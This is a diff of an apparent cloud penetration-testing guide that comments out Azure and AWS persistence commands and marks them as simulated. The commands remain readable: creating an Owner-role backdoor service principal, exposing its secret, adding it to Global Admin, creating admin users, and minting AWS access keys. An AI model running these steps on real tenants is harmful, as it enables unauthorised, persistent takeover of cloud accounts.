@@ -180,21 +180,23 @@ Establish persistence in Azure:
 
 ```powershell
 # Create backdoor service principal
-$spn = New-AzAdServicePrincipal -DisplayName "WebService" -Role Owner
-$BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($spn.Secret)
-$UnsecureSecret = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)
+# [SAFE-PAYLOAD] Simulate creating service principal
+# $BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($spn.Secret)
+# $UnsecureSecret = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)
 
 # Add service principal to Global Admin
-$sp = Get-MsolServicePrincipal -AppPrincipalId <AppID>
-$role = Get-MsolRole -RoleName "Company Administrator"
-Add-MsolRoleMember -RoleObjectId $role.ObjectId -RoleMemberType ServicePrincipal -RoleMemberObjectId $sp.ObjectId
+# [SAFE-PAYLOAD] Simulate adding service principal to Global Admin
+# $sp = Get-MsolServicePrincipal -AppPrincipalId <AppID>
+# $role = Get-MsolRole -RoleName "Company Administrator"
+# Add-MsolRoleMember -RoleObjectId $role.ObjectId -RoleMemberType ServicePrincipal -RoleMemberObjectId $sp.ObjectId
 
 # Login as service principal
 $cred = Get-Credential  # AppID as username, secret as password
 Connect-AzAccount -Credential $cred -Tenant "tenant-id" -ServicePrincipal
 
 # Create new admin user via CLI
-az ad user create --display-name <name> --password <pass> --user-principal-name <upn>
+# [SAFE-PAYLOAD] Simulate creating new admin user
+# az ad user create --display-name <name> --password <pass> --user-principal-name <upn>
 ```
 
 ### Phase 6: AWS Authentication
@@ -278,7 +280,7 @@ Establish persistence in AWS:
 aws iam list-access-keys --user-name <username>
 
 # Create backdoor access key
-aws iam create-access-key --user-name <username>
+# [SAFE-PAYLOAD] Simulate creating access key
 
 # Get all EC2 public IPs
 for region in $(cat regions.txt); do
